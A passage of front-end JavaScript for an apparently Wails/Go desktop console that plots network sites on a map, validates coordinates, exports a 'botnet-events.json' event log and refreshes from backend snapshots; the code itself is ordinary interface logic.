  const x = ((event.clientX - rect.left) / rect.width) * 1000;
  const y = ((event.clientY - rect.top) / rect.height) * 470;
  const [lon, lat] = unproject(x, y);
  $("#site-lat").value = lat.toFixed(4);
  $("#site-lon").value = lon.toFixed(4);
  picking = false;
  $("#placing-hint").hidden = true;
  $("#atlas").classList.remove("placing");
  $("#locations-dialog").showModal();
  notify(`Position set to ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
});
$("#locations-form").addEventListener("submit", async (event) => {
  event.preventDefault();
  const latText = $("#site-lat").value.trim(),
    lonText = $("#site-lon").value.trim();
  // Number("") is 0, which would silently place the site at null island.
  if (!latText || !lonText) {
    $("#locations-error").textContent =
      "Set latitude and longitude, or use Pick position on map.";
    return;
  }
  const lat = Number(latText),
    lon = Number(lonText);
  if (!Number.isFinite(lat) || !Number.isFinite(lon)) {
    $("#locations-error").textContent = "Latitude and longitude must be numbers.";
    return;
  }
  if (lat < -90 || lat > 90 || lon < -180 || lon > 180) {
    $("#locations-error").textContent =
      "Latitude must be −90…90 and longitude −180…180.";
    return;
  }
  try {
    state = await api(
      "AddSite",
      $("#site-name").value,
      $("#site-cidr").value,
      lat,
      lon,
    );
    $("#locations-error").textContent = "";
    event.target.reset();
    renderSites();
    render();
    notify("Location added to the atlas.");
  } catch (error) {
    $("#locations-error").textContent = String(error.message || error);
  }
});
$("#site-list").addEventListener("click", async (event) => {
  const button = event.target.closest("[data-remove-site]");
  if (!button) return;
  try {
    state = await api("RemoveSite", button.dataset.removeSite);
    renderSites();
    render();
  } catch (error) {
    $("#locations-error").textContent = String(error.message || error);
  }
});
$("#export-log").addEventListener("click", async () => {
  if (!state) return;
  if (!window.go?.main?.App) {
    const blob = new Blob(
      [JSON.stringify({ mode: "monitor", events: state.events }, null, 2)],
      { type: "application/json" },
    );
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = "botnet-events.json";
    document.body.append(link);
    link.click();
    link.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
    notify("Exported the event log.");
    return;
  }
  try {
    if (await api("ExportLog")) notify("Exported the event log.");
  } catch (error) {
    notify(String(error.message || error));
  }
});
function updateClock() {
  $("#clock").textContent = new Date().toISOString().slice(11, 19) + " UTC";
}
updateClock();
setInterval(updateClock, 30000);

// applySnapshot renders only when something actually changed.
function applySnapshot(next) {
  state = next;
  scheduleRender();
}

// The desktop build pushes snapshots when hub state changes; nothing polls.
function subscribedToEvents() {
  const on = window.runtime?.EventsOn;
  if (typeof on !== "function") return false;
  on("botnet:snapshot", (snapshot) => applySnapshot(snapshot));
  return true;
}

async function initialize() {
  try {
    state = await api("Snapshot");
    render();
    $("#backend-label").textContent = window.go?.main?.App
      ? "WAILS / GO"
      : "GO / DEV PREVIEW";
    $("#connection-error").hidden = true;
    await loadLand();
    if (!subscribedToEvents()) {
      // Browser preview has no desktop event channel, so fall back to a slow poll.
      setInterval(async () => {
        if (tickPending || document.hidden) return;
        tickPending = true;
        try {
          applySnapshot(await api("Refresh"));
          $("#connection-error").hidden = true;
        } catch (error) {
          $("#connection-error").textContent = `Console unavailable: ${String(error.message || error)}`;
          $("#connection-error").hidden = false;
        } finally {
          tickPending = false;
        }
      }, 5000);
    }
  } catch (error) {
    $("#connection-error").textContent = String(error.message || error);
    $("#connection-error").hidden = false;
  }
}
void initialize();
